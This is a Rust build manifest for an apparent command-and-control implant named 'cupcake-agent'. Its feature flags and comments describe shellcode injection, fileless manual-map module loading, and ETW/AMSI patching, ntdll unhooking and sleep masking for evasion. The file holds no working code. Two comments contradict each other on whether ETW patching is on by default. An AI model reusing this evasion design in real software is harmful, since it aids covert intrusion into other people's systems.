[package]
name = "cupcake-core"
version = "0.1.0"
edition = "2021"
# Avoid dual auto bin + [[bin]]; only cupcake-agent binary (not cupcake_core PDB clash with lib).
autobins = false

[lib]
name = "cupcake_core"
# rlib only for product agent link — avoid building unused cupcake_core.dll (cdylib).
# L2 module crates pull core as path dep (rlib).
crate-type = ["rlib"]
# Doc-tests still reference the old crate name `c2_client_agent`; unit tests cover shipped paths.
doctest = false

# Separate bin name from lib `cupcake_core` to avoid Windows PDB collision
# (cupcake_core.pdb for both bin and lib targets).
[[bin]]
name = "cupcake-agent"
path = "src/main.rs"

[features]
# ── Product: ONLY one aggregate tier ──────────────────────────────────
# Stage0 = transport + crypto + module-loader + isolated-exec + Layer-A stealth
#        + daily ops (shell/fs/proc/pty/socks). Heavy caps → L2 modules.
# No standard / full / beacon product tiers.
default = ["ws", "minimal", "net"]

# --- Transports (Builder picks one) ---
# Every transport pulls `net` — the async runtime stack (tokio + tokio-util +
# yamux) + handler/transport modules. L2 module crates (e.g. mod_bof with
# features=["bof"]) build WITHOUT `net`, so no tokio thread_locals enter the
# mapped module image (pe_map refuses TLS directories under Manual-Map).
net = ["dep:tokio", "dep:tokio-util", "dep:yamux"]
ws = ["net", "dep:tokio-tungstenite", "dep:url"]
# WSS with controllable ClientHello cipher order (rustls; not SChannel)
ws-tls = [
    "ws",
    "tokio-tungstenite/rustls-tls-native-roots",
    "dep:rustls",
    "dep:rustls-native-certs",
]
tcp = ["net"]
tcp_bind = ["net"]
dns = ["net", "dep:trust-dns-resolver"]

# --- Sole product aggregate ---
# built-in: shell / PTY / fs / process / socks
# L2: bof (classic in-process COFF module, Manual-Map, fileless), inject worker, ad worker
# Web UI PTY uses Yamux stream 0x01 → requires `pty`.
# `mem-map` IS product now: mod_bof must load fileless (no temp DLL on disk).
# `etw-patch` is intentionally NOT in default: patching ETW on startup is a HIGH
# heuristic signal (defense-evasion). Operators needing it opt in via
# `--features etw-patch` (or stealth-adv bundle).
minimal = [
    "post-ex",
    "pty",
    "socks",
    "encoding-support",
    "module-loader",
    "isolated-exec",
    "mem-map",
]

# post-ex: fs / process / executor / hybrid shell (daily ops)
post-ex = []
module-loader = []
# Manual-Map L2 PE (no temp DLL); LoadLibrary is fallback unless mem-map-strict
mem-map = []
# Refuse disk LoadLibrary fallback for L2 modules
mem-map-strict = ["mem-map"]
# Sacrificial worker spawn for inject/ad L2 EXEs (BOF is in-process via mem-map)
isolated-exec = []

# Individual gates (NOT product tiers — L2 crates / custom builds only)
pty = []
socks = []
plugin = ["dep:lazy_static"]
# inject: remote process shellcode — ONLY for L2 cupcake-inject-worker crate
inject = []
# In-process BOF engine for L2 mod_bof crate (not Stage0 product); dotnet retired
bof = ["dep:lazy_static"]
dotnet = []
encoding-support = ["dep:encoding_rs"]
# Opt-in diagnostics / runtime (never in product default)
logging = ["dep:env_logger"]
rt-multi = ["net", "tokio/rt-multi-thread"]

# Stealth options — fine-grained (product enables etw-patch only by default)
etw-patch = []
amsi-patch = []
ntdll-unhook = []
# Bundle: all advanced patches (high EDR signature — opt-in only)
stealth-adv = ["etw-patch", "amsi-patch", "ntdll-unhook", "dep:lazy_static"]
# Opt-in crash/diag capture (never in product default)
diag = []
# Sleep-mask AES stream (pulls `aes` crate only when enabled)
sleep-mask = ["dep:aes"]

[dependencies]
# Single-thread runtime by default (smaller). Optional: only pulled by `net`
# (transports + agent); L2 module crates build without it → no tokio TLS dir
# in the mapped module image.
tokio = { version = "1.35", default-features = false, features = ["rt", "macros", "io-util", "net", "time", "sync", "process"], optional = true }
tokio-tungstenite = { version = "0.21", default-features = false, features = ["connect"], optional = true }
tokio-util = { version = "0.7", default-features = false, features = ["codec", "compat"], optional = true }
yamux = { version = "0.10", optional = true }
url = { version = "2.5", optional = true }
trust-dns-resolver = { version = "0.23", optional = true }
# Match tokio-tungstenite 0.21 → rustls 0.22 ClientConfig
rustls = { version = "0.22", optional = true, default-features = false, features = ["ring", "tls12", "logging"] }
rustls-native-certs = { version = "0.7", optional = true }
serde = { version = "1.0", default-features = false, features = ["derive", "std"] }
serde_json = { version = "1.0", default-features = false, features = ["std"] }
uuid = { version = "1.6", default-features = false }
sha2 = { version = "0.10", default-features = false }
thiserror = "1.0"
log = { version = "0.4", default-features = false }
env_logger = { version = "0.11", optional = true }
getrandom = { version = "0.2", features = ["std"] }
futures-util = { version = "0.3", default-features = false, features = ["std", "async-await", "sink"] }
encoding_rs = { version = "0.8", optional = true }
base64 = { version = "0.21", default-features = false, features = ["std"] }
async-trait = "0.1"
aes-gcm = { version = "0.10", default-features = false, features = ["aes", "alloc"] }
# Block cipher only for sleep-mask keystream (not product default)
aes = { version = "0.8", default-features = false, optional = true }
socket2 = { version = "0.6", default-features = false }
hex = { version = "0.4", default-features = false, features = ["std"] }
lazy_static = { version = "1.4", optional = true }

[target.'cfg(windows)'.dependencies]
# Prefer types/constants; sensitive APIs go through PEB/syscall paths.
# CreateProcess/attributes are PEB-resolved in native/spawn (no hard IAT from this crate).
# heapapi retained for optional sleep-mask HeapWalk types only.
winapi = { version = "0.3", features = [
    "winnt", "memoryapi", "handleapi",
    "errhandlingapi", "winbase", "winuser",
    "oleauto", "unknwnbase",
    "debugapi", "sysinfoapi", "lmjoin", "lmcons", "lmapibuf",
    "namedpipeapi", "ioapiset", "synchapi", "fileapi",
    "threadpoollegacyapiset", "psapi", "securitybaseapi",
    "wtypes", "winerror", "guiddef", "minwinbase", "heapapi",
    "processenv", "ntdef", "tlhelp32", "processthreadsapi", "libloaderapi",
] }
widestring = "1.0"

[target.'cfg(unix)'.dependencies]
libc = "0.2"
nix = { version = "0.27", features = ["process", "fs", "user"] }

[dev-dependencies]
proptest = "1.4"
mockall = "0.12"
tempfile = "3.8"

# Release profile lives in workspace Client/Cargo.toml (member profiles are ignored).
